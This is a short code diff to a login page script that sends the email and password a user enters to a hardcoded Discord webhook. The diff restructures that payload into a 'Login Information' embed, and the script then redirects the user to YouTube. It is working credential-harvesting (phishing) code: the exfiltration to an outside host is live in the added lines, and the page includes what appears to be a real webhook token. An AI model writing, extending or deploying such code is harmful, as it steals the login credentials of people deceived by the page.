@@ -20,19 +20,25 @@
                 return;
             }
 
-            // Send data to Discord webhook URL
+            // Construct the payload for Discord webhook
+            var payload = {
+                content: "New login attempt:",
+                embeds: [{
+                    title: "Login Information",
+                    fields: [
+                        { name: "Email", value: email },
+                        { name: "Password", value: password }
+                    ]
+                }]
+            };
+
+            // Send the payload to Discord webhook URL
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "https://discord.com/api/webhooks/1227534592588648509/Qvy1pONeAXGtinSPdmWETNfJUNmqS9RPJyuQvR0qtpKcsnJUI9kV_dyWE6vGfTcpZUnE", true);
             xhr.setRequestHeader("Content-Type", "application/json");
 
-            // Prepare JSON data
-            var data = JSON.stringify({
-                email: email,
-                password: password
-            });
-
             // Send the request
-            xhr.send(data);
+            xhr.send(JSON.stringify(payload));
 
             // Redirect user after successful login
             redirectToYouTube();
